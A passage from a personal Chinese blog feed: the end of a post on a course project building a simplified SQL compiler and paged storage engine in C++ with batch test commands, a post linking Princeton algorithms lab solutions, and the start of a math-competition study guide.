    <span class="p">}</span><span class="n">rightOperandType</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">intval</span><span class="p">;</span>
    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">chval</span><span class="p">;</span>

    <span class="k">struct</span> <span class="nc">conditionNode</span><span class="o">*</span> <span class="n">left</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">conditionNode</span><span class="o">*</span> <span class="n">right</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
<span class="p">};</span>

<span class="c1">// SELECT [columnNames] FROM [tables] WHERE [conditions];</span>
<span class="k">struct</span> <span class="nc">selectNode</span><span class="p">{</span>
    <span class="k">struct</span> <span class="nc">columnNode</span><span class="o">*</span> <span class="n">columnNames</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">tableNode</span><span class="o">*</span> <span class="n">tables</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">conditionNode</span><span class="o">*</span> <span class="n">conditions</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
<span class="p">};</span>

<span class="c1">// for INSERT node;</span>
<span class="k">struct</span> <span class="nc">valueNode</span><span class="p">{</span>
    <span class="k">enum</span> <span class="n">type</span><span class="p">{</span>
        <span class="n">INT</span><span class="p">,</span> <span class="n">STRING</span>
    <span class="p">}</span><span class="n">type</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">intval</span><span class="p">;</span>
    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">chval</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">valueNode</span><span class="o">*</span> <span class="n">next</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
<span class="p">};</span>

<span class="c1">// INSERT INTO [table] ([columnNames]) VALUES ([values]);</span>
<span class="c1">// INSERT INTO [table] VALUES ([values]);</span>
<span class="k">struct</span> <span class="nc">insertNode</span><span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">tableName</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">columnNode</span><span class="o">*</span> <span class="n">columnNames</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">valueNode</span><span class="o">*</span> <span class="n">values</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
<span class="p">};</span>

<span class="c1">// for UPDATE node;</span>
<span class="k">struct</span> <span class="nc">assignmentNode</span><span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">columnName</span><span class="p">;</span>
    <span class="k">enum</span> <span class="n">type</span><span class="p">{</span>
        <span class="n">INT</span><span class="p">,</span> <span class="n">STRING</span>
    <span class="p">}</span><span class="n">type</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">intval</span><span class="p">;</span>
    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">chval</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">assignmentNode</span><span class="o">*</span> <span class="n">next</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
<span class="p">};</span>

<span class="c1">// UPDATE [tableName] SET [assignments] WHERE [conditions];</span>
<span class="k">struct</span> <span class="nc">updateNode</span><span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">tableName</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">assignmentNode</span><span class="o">*</span> <span class="n">assignments</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">conditionNode</span><span class="o">*</span> <span class="n">conditions</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
<span class="p">};</span>

<span class="c1">// DELETE FROM [tableName];</span>
<span class="c1">// DELETE FROM [tableName] WHERE [conditions];</span>
<span class="k">struct</span> <span class="nc">deleteNode</span><span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">tableName</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">conditionNode</span><span class="o">*</span> <span class="n">conditions</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
<span class="p">};</span>

<span class="c1">// API in Databases.h</span>
<span class="k">class</span> <span class="nc">Database</span> <span class="p">{</span>
<span class="nl">public:</span>
    <span class="kt">void</span> <span class="n">showDatabases</span><span class="p">();</span>
    <span class="kt">void</span> <span class="n">useDatabase</span><span class="p">(</span><span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&amp;</span> <span class="n">databaseName</span><span class="p">);</span>
    <span class="kt">void</span> <span class="n">dropDatabase</span><span class="p">(</span><span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&amp;</span> <span class="n">databaseName</span><span class="p">);</span>
    <span class="kt">void</span> <span class="n">createDatabase</span><span class="p">(</span><span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&amp;</span> <span class="n">databaseName</span><span class="p">);</span>
    <span class="kt">void</span> <span class="n">showTables</span><span class="p">();</span>
    <span class="kt">void</span> <span class="n">dropTable</span><span class="p">(</span><span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&amp;</span> <span class="n">tableName</span><span class="p">);</span>
    <span class="kt">void</span> <span class="n">createTable</span><span class="p">(</span><span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&amp;</span> <span class="n">tableName</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">columnNode</span><span class="o">*</span> <span class="n">columnHead</span><span class="p">);</span>
    <span class="kt">void</span> <span class="n">select</span><span class="p">(</span><span class="k">struct</span> <span class="nc">selectNode</span><span class="o">*</span> <span class="n">node</span><span class="p">);</span>
    <span class="kt">void</span> <span class="n">insert</span><span class="p">(</span><span class="k">struct</span> <span class="nc">insertNode</span><span class="o">*</span> <span class="n">node</span><span class="p">);</span>
    <span class="kt">void</span> <span class="n">update</span><span class="p">(</span><span class="k">struct</span> <span class="nc">updateNode</span><span class="o">*</span> <span class="n">node</span><span class="p">);</span>
    <span class="kt">void</span> <span class="n">deleteFrom</span><span class="p">(</span><span class="k">struct</span> <span class="nc">deleteNode</span><span class="o">*</span> <span class="n">node</span><span class="p">);</span>

<span class="nl">private:</span>
    <span class="kt">int</span> <span class="n">currentState</span><span class="p">;</span> <span class="c1">// 当前系统状态</span>
    <span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">dataPath</span> <span class="o">=</span> <span class="s">"../data"</span><span class="p">;</span>
    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">currentDatabase</span><span class="p">;</span> <span class="c1">// 当前选中的数据库</span>
    <span class="n">std</span><span class="o">::</span><span class="n">unordered_map</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&gt;</span> <span class="n">tableFiles</span><span class="p">;</span>
    <span class="n">Pager</span><span class="o">*</span> <span class="n">currentPage</span><span class="p">;</span> <span class="c1">// 当前页 (这里可以改为存放页的某类容器，可以实现LRU)</span>
<span class="p">}</span>
</code></pre></div></div> <p>其他结点结构都很简单，都是拉链结构。</p> <p>唯独<code class="language-plaintext highlighter-rouge">conditionNode</code>要特别注意,遍历这个结点相当于LDR遍历二叉树(前序遍历)</p> <p>比如<code class="language-plaintext highlighter-rouge">... WHERE id = 3 AND name = 'chen'</code>，传递给后端的树结构如下:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-05-17/conditionNodeExample-480.webp 480w,/assets/img/2024-05-17/conditionNodeExample-800.webp 800w,/assets/img/2024-05-17/conditionNodeExample-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-05-17/conditionNodeExample.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>即，<code class="language-plaintext highlighter-rouge">op</code>的枚举类型是<code class="language-plaintext highlighter-rouge">AND</code>或<code class="language-plaintext highlighter-rouge">OR</code>，则说明这个结点是一个连接的结点，或者说是一个父亲结点。</p> <p>只有叶子结点是有<code class="language-plaintext highlighter-rouge">columnName</code>和<code class="language-plaintext highlighter-rouge">intval</code>或<code class="language-plaintext highlighter-rouge">chval</code>的。</p> <p>这样就能清晰表示条件。</p> <h2 id="存储结构设计">存储结构设计</h2> <p>总体结构如下:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-05-17/memoryArch-480.webp 480w,/assets/img/2024-05-17/memoryArch-800.webp 800w,/assets/img/2024-05-17/memoryArch-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-05-17/memoryArch.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>采取分页的思想，一个文件为一张表，一张表内有若干页，一页内有若干行。</p> <p>对于每一个页：</p> <ul> <li>首先要有一个<code class="language-plaintext highlighter-rouge">File Header</code>，除了表明页的信息外，还有两个指针，分别指向上一页和下一页。</li> <li>再来一个<code class="language-plaintext highlighter-rouge">Page Header</code>，存储一些该页的状态信息。</li> <li>再设计一个<code class="language-plaintext highlighter-rouge">Infimum + Supermum</code>，用来记录当前页最小和最大的记录。</li> <li>接下来设计一个<code class="language-plaintext highlighter-rouge">Page Directory</code>，对下文的<code class="language-plaintext highlighter-rouge">User Records</code>做一个简单索引。</li> <li>最后才是<code class="language-plaintext highlighter-rouge">User Records</code>用来存储每一行的数据，数据之间物理上按先后顺序存储，逻辑上按主键顺序形成单链表。</li> </ul> <p>主要在<code class="language-plaintext highlighter-rouge">Pager.h</code>中实现页机制(读入内存的页):</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">PAGE_SIZE</span> <span class="o">=</span> <span class="mi">4096</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">FILE_HEADER_SIZE</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">PAGE_HEADER_SIZE</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">RECORDS_SIZE</span> <span class="o">=</span> <span class="n">PAGE_SIZE</span> <span class="o">-</span> <span class="n">FILE_HEADER_SIZE</span> <span class="o">-</span> <span class="n">PAGE_HEADER_SIZE</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ROW_PER_PAGE</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">RECORDS_SIZE</span> <span class="o">/</span> <span class="mi">64</span><span class="p">;</span> <span class="c1">// 8 + 63 = 71; 大概63行数据，8行头信息</span>
<span class="k">const</span> <span class="kt">int</span> <span class="n">DEFAULT_INFIMUM</span> <span class="o">=</span> <span class="mi">99999</span><span class="p">;</span>
<span class="k">const</span> <span class="kt">int</span> <span class="n">DEFAULT_SUPERMUM</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

<span class="k">struct</span> <span class="nc">FileHeader</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">pageNumber</span><span class="p">;</span> <span class="c1">// 当前页的页号</span>
    <span class="n">std</span><span class="o">::</span><span class="n">unordered_map</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="p">,</span> <span class="kt">int</span><span class="o">&gt;</span> <span class="n">columnOffset</span><span class="p">;</span> <span class="c1">// 在Records中列名对应的偏移（第几个逗号）</span>
    <span class="kt">int</span> <span class="n">prevPage</span><span class="p">;</span> <span class="c1">// 上一页偏移 (-PAGE_SIZE)</span>
    <span class="kt">int</span> <span class="n">nextPage</span><span class="p">;</span> <span class="c1">// 下一页偏移 (+PAGE_SIZE)</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="nc">PageHeader</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">recordsCount</span><span class="p">;</span> <span class="c1">// 当前页记录的数目</span>
    <span class="kt">int</span> <span class="n">pageState</span><span class="p">;</span> <span class="c1">// 页的状态</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="nc">Record</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span> <span class="c1">// 主键</span>
    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">data</span><span class="p">;</span> <span class="c1">// 数据(逗号分隔)</span>
    <span class="kt">int</span> <span class="n">nextOffset</span><span class="p">;</span> <span class="c1">// 下一条数据的偏移量</span>
<span class="p">};</span>

<span class="k">class</span> <span class="nc">Pager</span> <span class="p">{</span>
<span class="nl">public:</span>
    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">path</span><span class="p">;</span> <span class="c1">// 当前页所属表名（即文件名）</span>
    <span class="n">FileHeader</span> <span class="n">fileHeader</span><span class="p">;</span>
    <span class="n">PageHeader</span> <span class="n">pageHeader</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">Infimum</span><span class="p">;</span> <span class="c1">// 当前页最小记录</span>
    <span class="kt">int</span> <span class="n">Supermum</span><span class="p">;</span> <span class="c1">// 当前页最大记录</span>
    <span class="kt">bool</span> <span class="n">isDirty</span><span class="p">;</span>
    <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span> <span class="n">pageDirectory</span><span class="p">;</span> <span class="c1">// 页目录存储记录的偏移量</span>
    <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">Record</span><span class="o">&gt;</span> <span class="n">records</span><span class="p">;</span> <span class="c1">// 当前页的记录</span>

    <span class="n">Pager</span><span class="p">(</span><span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&amp;</span> <span class="n">filePath</span><span class="p">);</span> <span class="c1">// 初始化时从外存读页</span>

    <span class="n">Pager</span><span class="o">*</span> <span class="n">readPage</span><span class="p">(</span><span class="kt">int</span> <span class="n">ID</span><span class="p">);</span> <span class="c1">// 将页从外存读入内存，这里还没实现BTree，先根据path读文件，遍历页来找目标id所在的页</span>
    <span class="kt">void</span> <span class="n">writePage</span><span class="p">();</span> <span class="c1">// 页的状态设为DIRTY，并在内存中更新页</span>
    <span class="kt">bool</span> <span class="n">isFull</span><span class="p">();</span>
<span class="p">};</span>
</code></pre></div></div> <h2 id="简单的脏页机制">简单的脏页机制</h2> <p>在频繁IO的程序中，程序的瓶颈往往是IO速率。</p> <p>所以这里简单实现一个脏页机制，只有切换数据库等操作再将脏页写回外存，从而保证数据一致性。</p> <p>这样在频繁对一张表进行操作时，不需要大量IO（比如频繁插入或更新数据后又读数据，在内存的页暂时不写回外存，这样提升效率）</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-05-17/IODemo-480.webp 480w,/assets/img/2024-05-17/IODemo-800.webp 800w,/assets/img/2024-05-17/IODemo-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-05-17/IODemo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>在<code class="language-plaintext highlighter-rouge">Pager.h</code>中有一项<code class="language-plaintext highlighter-rouge">bool isDirty</code>,只有进行插入删除更新的操作后，该页标记为<code class="language-plaintext highlighter-rouge">DIRTY</code></p> <p>同时，在<code class="language-plaintext highlighter-rouge">Database.h</code>中有一个当前页<code class="language-plaintext highlighter-rouge">Pager* currentPage</code>指向读入内存的当前页，在选中数据库后的操作都是在内存页完成，直到类似切换数据库的指令调用，再写入外存。同时更新<code class="language-plaintext highlighter-rouge">currentPage</code>的指向。</p> <h1 id="批处理测试">批处理测试</h1> <p>这里采用重定向符号来对程序大量输入测试语句。用的bat（批处理程序）</p> <div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cls</span>
<span class="nb">cd</span> .\cmake<span class="na">-build-release</span>\
<span class="nb">cls</span>
.\myDBMS.exe <span class="o">&lt;</span> ..\commands.txt
</code></pre></div></div> <p>其中，<code class="language-plaintext highlighter-rouge">commands.txt</code>中的测试数据为:</p> <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show databases;
CREATE DATABASE tmp;
SHOW DATABASES;
create database del;
SHOW DATABASES;
DROP DATABASE del;
SHOW DATABASES;
use demo;
show tables;
create table tmp(id INT, testname CHAR(25), sex INT);
show tables;
drop table tmp;
show tables;
select * from course;
insert into course(cname, cid) values('TETSCOURSE', 13);
select * from course;
select * from student;
insert into student values('TEST',20,2);
insert into student values('TEST2',999,2);
insert into student values('TEST3',999,2);
insert into student values('TEST4',999,2);
insert into student values('TEST5',999,2);
insert into student values('TEST6',999,2);
select * from student;
insert into student(sname,sage) values('TEST7',555);
insert into student(sname,sage) values('TEST8',666);
select * from student;
select sname from student;
select ssex from student;
select sname,sage from student;
select sname,sage from student where sage &gt; 20;
select sname,sage from student where sage &lt; 20;
select sname,sage from student where sage = 20;
select sname,sage from student where sage &lt;&gt; 20;
select sname,sage from student where sage != 20;
select sname,sage from student where (((sage = 20)));
select sname,sage from student where sage &gt; 18 and sage &lt; 35;
select sname,sage from student where (sage &gt; 18) and (sage &lt; 35);
select sname,sage from student where sage &lt; 18 or sage &gt; 35;
select sname,sage from student where (sage &lt; 18) or (sage &gt; 35);
select sname,sage from student where sname = 'chen' and sage = 20;
select * from student;
delete from student where sage &gt; 100;
select * from student;
delete from student where sname = 'TEST' and sage = 20 and ssex = 2;
select * from student;
select * from student where sname = 'chen';
update student set sage = 21 where sname = 'chen';
select * from student where sname = 'chen';
select * from student where sname = 'clay';
update student set sage = 999 where sname = 'clay';
select * from student where sname = 'clay';
exit
</code></pre></div></div>]]></content><author><name></name></author><category term="西电相关"/><category term="项目"/><category term="c"/><category term="cpp"/><category term="compiler"/><category term="sql"/><summary type="html"><![CDATA[西电编译原理大作业:精简SQL编译器实现]]></summary></entry><entry><title type="html">Princeton Algorithm I &amp;amp; II Labs</title><link href="https://iamnotphage.github.io/blog/2023/algs4/" rel="alternate" type="text/html" title="Princeton Algorithm I &amp;amp; II Labs"/><published>2023-10-10T15:59:00+00:00</published><updated>2023-10-10T15:59:00+00:00</updated><id>https://iamnotphage.github.io/blog/2023/algs4</id><content type="html" xml:base="https://iamnotphage.github.io/blog/2023/algs4/"><![CDATA[<p>My personal solutions for algs4 labs💀</p> <h1 id="websites">Websites</h1> <p>官网和coursera上有很多资料，也有实验的在线评测平台。</p> <p>课程官网：https://algs4.cs.princeton.edu/home/</p> <p>Coursera官网：https://www.coursera.org/</p> <p>部分我觉得有意思的课后练习题：<a href="https://github.com/Iamnotphage/Algs4-Labs/blob/main/Exercises/assignments.md">Click Here</a></p> <p>这门课在西电开设，名为算法分析与设计。</p> <p>2.5学分，本人最终总评96。西电相关资料请看文件夹。</p> <h1 id="hello">hello</h1> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2023-10-10/logo-480.webp 480w,/assets/img/2023-10-10/logo-800.webp 800w,/assets/img/2023-10-10/logo-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2023-10-10/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>主要配置环境，测试algs4.jar是否能正常编译运行</p> <p>说实话，这个是最搞的。</p> <p>Windows平台下，最简单的方法如下：(摸索了很久)</p> <p><a href="https://lift.cs.princeton.edu/java/windows/">点击这个网址</a></p> <p>然后下载<code class="language-plaintext highlighter-rouge">lift-java-installer.exe</code>这个一键安装的内容包含：</p> <ul> <li>IntelliJ</li> <li>Git</li> <li>还有一些配置文件</li> </ul> <p>然后运行，它会覆盖classpath还有原先的JAVA path。如果你喜欢挑战自我可以试试手动配置</p> <p>(安装JDK，添加JAVAPATH，下载algs4.jar，添加到classpath，再安装git，再把algs4.jar添加到git的path，然后用IDE导入algs4.jar包)。不推荐💀</p> <p>上述内容是可选的，安装了Git或者IntelliJ可以不用勾选。</p> <p>然后下载algs4.jar包</p> <p>接下来在IDE里面导入包 (Bing一下，你就知道)</p> <p>能够在Git Bash中使用</p> <p><code class="language-plaintext highlighter-rouge">javac-algs4</code></p> <p><code class="language-plaintext highlighter-rouge">java-algs4</code></p> <p>这两个命令，就证明成功</p> <h1 id="percolation">percolation</h1> <p><a href="https://github.com/Iamnotphage/Algs4-Labs/blob/main/Percolation.md">Click Here</a></p> <h1 id="queues">queues</h1> <p><a href="https://github.com/Iamnotphage/Algs4-Labs/blob/main/Queues.md">Click Here</a></p> <h1 id="collinear">collinear</h1> <p><a href="https://github.com/Iamnotphage/Algs4-Labs/blob/main/Collinear.md">Click Here</a></p> <h1 id="8puzzle">8puzzle</h1> <p><a href="https://github.com/Iamnotphage/Algs4-Labs/blob/main/8puzzle.md">Click Here</a></p> <h1 id="kdtree">kdtree</h1> <p><a href="https://github.com/Iamnotphage/Algs4-Labs/blob/main/KdTree.md">Click Here</a></p> <h1 id="wordnet">wordnet</h1> <p><a href="https://github.com/Iamnotphage/Algs4-Labs/blob/main/WordNet.md">Click Here</a></p> <h1 id="seam">seam</h1> <p><a href="https://github.com/Iamnotphage/Algs4-Labs/blob/main/Seam.md">Click Here</a></p>]]></content><author><name></name></author><category term="西电相关"/><category term="项目"/><category term="java"/><category term="algorithm"/><summary type="html"><![CDATA[普林斯顿算法第四版课后Labs]]></summary></entry><entry><title type="html">CMC-SpeedRun</title><link href="https://iamnotphage.github.io/blog/2022/%E9%80%9F%E9%80%9A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%95%B0%E5%AD%A6%E7%AB%9E%E8%B5%9B/" rel="alternate" type="text/html" title="CMC-SpeedRun"/><published>2022-12-31T15:59:00+00:00</published><updated>2022-12-31T15:59:00+00:00</updated><id>https://iamnotphage.github.io/blog/2022/%E9%80%9F%E9%80%9A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%95%B0%E5%AD%A6%E7%AB%9E%E8%B5%9B</id><content type="html" xml:base="https://iamnotphage.github.io/blog/2022/%E9%80%9F%E9%80%9A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%95%B0%E5%AD%A6%E7%AB%9E%E8%B5%9B/"><![CDATA[<p><img src="https://img.shields.io/github/repo-size/Iamnotphage/CMC-SpeedRun" alt=""/> <img src="https://img.shields.io/badge/license-CC0--1.0-blue" alt=""/> <img src="https://img.shields.io/github/stars/Iamnotphage/CMC-SpeedRun?style=social" alt=""/></p> <p>速通<a href="http://www.cmathc.cn/">全国大学生数学竞赛</a>教程(非数学专业)</p> <blockquote> <p>针对🐹🐹的CMC-SpeedRun</p> </blockquote> <h1 id="前言">前言</h1> <h2 id="读者须知">读者须知</h2> <p>本文适用于国内准大学生、大学生对CMC(全国大学生数学竞赛)或其他类似竞赛有准备需要的学生或者🐹🐹。</p> <p>注意是<strong>非数，非数，非数</strong>！鼠鼠是CS学生，所以参加的是非数学类的CMC！本SpeedRun教程也是针对非数的教程。</p> <p>一般CMC比赛时间：初赛每年11月左右，决赛每年3月左右，具体情况具体分析。</p> <p>尤其是刚学完微积分课程的学生来说，知识掌握程度最佳，基本上不用准备也可能拿到初赛的三等奖，当然拿奖与否，跟你报名的赛区也是息息相关。</p> <p>本文加入了适量emoji表情以增加可读性,请见谅。</p> <p>前排：如果Github你下载太慢，欢迎前往以下链接下载 https://www.aliyundrive.com/s/qun3Q7sy5EG</p> <h2 id="情况">🐹🐹情况</h2> <p>下面介绍一下🐹🐹的情况。</p> <p>高考数学全国一卷120(并非你想的那么高) 所以人人都有机会完美速通CMC</p> <p>高数上总评98</p> <p>高数下总评92</p> <p>线代总评97</p> <p>离散数学总评95</p> <p>从课内成绩来看，🐹🐹算是中规中矩，前期的铺垫固然重要，但是要速通CMC，后期的努力更重要。</p> <p>大二参加第十四届全国大学生数学竞赛,初赛66分一等奖 (校内名单，所以有具体分数)</p> <p>张贴在此处以增加🐹🐹文章的信服力,不然大街上随便找坨史也可以写这篇文章。</p> <p>2023年6月补档，的确没有进入决赛，这里给大家一个参考，第十四届初赛66分编号88应该是全省88名没有达到决赛线。</p> <h1 id="如何速通">如何速通</h1> <p>首先必须说明，在本科之前的基础也是重要的，尤其是三角函数、导数等工具的掌握，可能会影响本科课程中微积分的学习，但是影响不算巨大。</p> <p>为了避免部分🐹🐹不知所措，茫然前行，本🐹🐹根据个人经验✍不断完善此库，以便帮助各位实现速通CMC。</p> <p>在下文，我将列出在国内正常高中学习会涉及并且CMC中也会出现的数学工具,接下来是各种扩展知识点的介绍，最后是关于真题和一些资料的建议和推荐。</p> <p>已经在本科学习完微积分课程<strong>并且总评优秀</strong>的可以跳过第零步和第一步。</p> <h2 id="第零步准备工作">第零步：准备工作</h2> <h3 id="三角函数部分">🌟三角函数部分</h3> <p>除了高中必修的三角函数变换、辅助角变换之后，大部分人都对积化和差、和差化积、万能公式不太熟悉，不必要死记硬背，但是遇到题目要能想到这一条退路。</p> <p>下面三组公式常常在CMC中的求极限、求积分等题目中有出奇制胜的效果。</p> <p>推导、记忆技巧等，详见各类辅助教材、网站。</p> <p><strong>积化和差</strong></p> \[{\displaystyle \sin \alpha \cos \beta ={\sin(\alpha +\beta )+\sin(\alpha -\beta ) \over 2}}\] \[{\displaystyle \cos \alpha \sin \beta ={\sin(\alpha +\beta )-\sin(\alpha -\beta ) \over 2}}\] \[{\displaystyle \cos \alpha \cos \beta ={\cos(\alpha +\beta )+\cos(\alpha -\beta ) \over 2}}\] \[{\displaystyle \sin \alpha \sin \beta =-{\cos(\alpha +\beta )-\cos(\alpha -\beta ) \over 2}}\] <p><strong>和差化积</strong></p> \[{\displaystyle \sin \alpha +\sin \beta =2\sin {\frac {\alpha +\beta }{2}}\cos {\frac {\alpha -\beta }{2}}}\] \[{\displaystyle \sin \alpha -\sin \beta =2\cos {\alpha +\beta \over 2}\sin {\alpha -\beta \over 2}}\] \[{\displaystyle \cos \alpha +\cos \beta =2\cos {\frac {\alpha +\beta }{2}}\cos {\frac {\alpha -\beta }{2}}}\] \[{\displaystyle \cos \alpha -\cos \beta =-2\sin {\alpha +\beta \over 2}\sin {\alpha -\beta \over 2}}\] <p><strong>万能公式</strong></p> \[\displaystyle \sin{x}=\frac{2t}{1+t^2}\] \[\displaystyle \cos{x}=\frac{1-t^2}{1+t^2}\] \[{\displaystyle \tan{x}=\frac{2t}{1-t^2}}\] \[{\displaystyle x=2\arctan{t}}\] <h3 id="导数工具部分">🌟导数工具部分</h3> <p>所有初等函数的导数，链式法则，以及最重要的一个，<strong>取对数求导法</strong>。</p> <p>例如，求 \(y=x^x\) 的导数</p> <blockquote> \[\ln y =x\ln x\] </blockquote> <p>再求导,后面的步骤我就不说了。</p> <h3 id="数列部分">🌟数列部分</h3> <p>基本的裂项，不动点法。</p> <h3 id="不等式部分">🌟不等式部分</h3> <p>均值不等式、<strong>柯西不等式</strong>、<strong>常见放缩</strong>。</p> <h3 id="反三角函数部分">🌟反三角函数部分</h3> <p>需要掌握定义、导数、以及<strong>一些常见恒等式</strong></p> \[arctan\frac{a-b}{1+ab}=arctan(a)-arctan(b)\] \[arctanx+arctan\frac{1}{x}=\frac{\pi}{2}\] <h2 id="第一步打好基础">第一步：打好基础</h2> <p>我将在这部分主要叙述各个阶段的应对措施，希望能够帮助到各位🐹🐹</p> <p>教材我们学校用的是同济的高等数学，🐹🐹也有幸溜进交大上过一次微分方程的课，他们用的是高等教育出版社的《工科数学分析基础》，各自教材差别不算特别大，最好还是根据你们上课的教材为主。</p> <p>如果您正在进行微积分课程/高等数学课程/数学分析课程，在能保证目前所学内容掌握良好的情况下，自学后续内容能够更好地帮助实现速通。</p> <p>如果很不幸，您跟不上您正在进行的微积分课程，请参考目录中的<strong>资料库-推荐书籍</strong>进行额外努力，打好基础是速通的必要条件。</p> <p>如果很幸运您恰好学完了微积分课程，并且掌握情况良好，请直接参考第二步，您也不需要基础的辅助教材。</p> <p>具体来说，我没遇到什么特别难的微积分的题目，只要跟着老师或者自学，按部就班学习的话，基本上课内成绩不会太差。</p> <p>其次，要明确 <strong>能力!=分数</strong> ，绝大多数情况下，分数只能做个参考，特别是大部分高校评价成绩都是采用平时和卷面占比来计算成绩，所以请各位🐹🐹不要太放在心上。</p> <h2 id="第二步各章节知识点dlc">第二步：各章节知识点DLC</h2> 